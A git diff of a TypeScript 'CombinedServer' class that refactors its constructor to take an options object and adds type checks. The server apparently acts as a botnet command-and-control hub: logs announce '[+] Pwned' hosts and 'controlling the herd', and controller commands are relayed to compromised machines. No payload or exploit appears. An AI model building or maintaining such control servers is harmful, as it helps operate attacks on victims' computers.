@@ -1,6 +1,12 @@
-import { createPacket } from '../../common/src/packet';
 import hosts = require('./hosts');
 import controllers = require('./controllers');
+
+interface CombinedServerOpts {
+    host: string | undefined;
+    port: number | undefined;
+    controlHost: string | undefined;
+    controlPort: number | undefined;
+}
 
 export class CombinedServer {
     hostList: Map<number, hosts.Host>;
@@ -10,13 +16,20 @@ export class CombinedServer {
     hostServer: hosts.HostServer;
     controlServer: controllers.ControlServer;
 
-    /**
-     * @param {string} hostIP
-     * @param {number} port
-     * @param {string} controlHostIP
-     * @param {number} controlPort
-     */
-    constructor(hostIP: string, port: number, controlHostIP: string, controlPort: number) {
+    constructor(opts: CombinedServerOpts) {
+        const defaultOpts: CombinedServerOpts = {
+            host: '0.0.0.0',
+            port: 6996,
+            controlHost: '127.0.0.1',
+            controlPort: 35768
+        };
+        
+        // for (let optName in defaultOpts) {
+        //     for (optName in opts)) {
+        //         opts[optName]
+        //     }
+        // }
+
         this.hostList = new Map();
         this.controllerList = new Map();
         this.nextHostID = 0;
@@ -32,10 +45,7 @@ export class CombinedServer {
         this.controlServer.on('connection', this.handleControllerConnection.bind(this));
     }
 
-    /**
-     * @param {hosts.Host} host
-     */
-    handleHostConnection(host) {
+    handleHostConnection(host: hosts.Host) {
         console.log(`[+] Pwned ${host.ip} ;)`);
         let hostID = this.nextHostID++;
         this.hostList.set(hostID, host);
@@ -64,10 +74,7 @@ export class CombinedServer {
         }
     }
 
-    /**
-     * @param {controllers.Controller} controller
-     */
-    handleControllerConnection(controller) {
+    handleControllerConnection(controller: controllers.Controller) {
         console.log(`[+] Now controlling the herd from ${controller.ip}`);
         let controllerID = this.nextControllerID++;
         this.controllerList.set(controllerID, controller);
@@ -79,7 +86,12 @@ export class CombinedServer {
         }
 
         controller.on('hostcommand', (hostid, commandPacket) => {
-            this.hostList.get(hostid).sendPacket(commandPacket);
+            let hostOrUndefined = this.hostList.get(hostid);
+            if (hostOrUndefined === undefined) {
+                throw new Error('invalid host ID');
+            }
+            let host = hostOrUndefined;
+            host.sendPacket(commandPacket);
         });
 
         controller.on('close', () => {
